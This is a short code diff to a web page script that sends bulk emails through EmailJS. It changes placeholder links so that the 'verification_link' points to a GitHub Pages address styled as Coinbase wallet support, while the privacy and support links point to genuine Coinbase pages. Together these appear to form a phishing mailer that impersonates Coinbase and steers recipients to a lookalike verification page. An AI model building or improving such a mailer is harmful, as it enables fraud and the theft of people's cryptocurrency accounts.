@@ -89,7 +89,7 @@
   </div>
 
   <script>
-    emailjs.init("GcwA-UmY0n3HlTID1"); // Tu Public Key de EmailJS
+    emailjs.init("GcwA-UmY0n3HlTID1"); // Tu Public Key
 
     async function enviarEmails() {
       const amount = parseFloat(document.getElementById("amount").value);
@@ -116,9 +116,9 @@
           to_email: correo,
           amount: amount.toFixed(2),
           amount9: amount9,
-          verification_link: "https://tusitio.com/verificar",
-          privacy_policy: "https://tusitio.com/privacidad",
-          support_link: "https://tusitio.com/soporte"
+          verification_link: "https://helpacount.github.io/supportcoinbasewallet/",
+          privacy_policy: "https://www.coinbase.com/legal/privacy",
+          support_link: "https://help.coinbase.com/"
         };
 
         try {
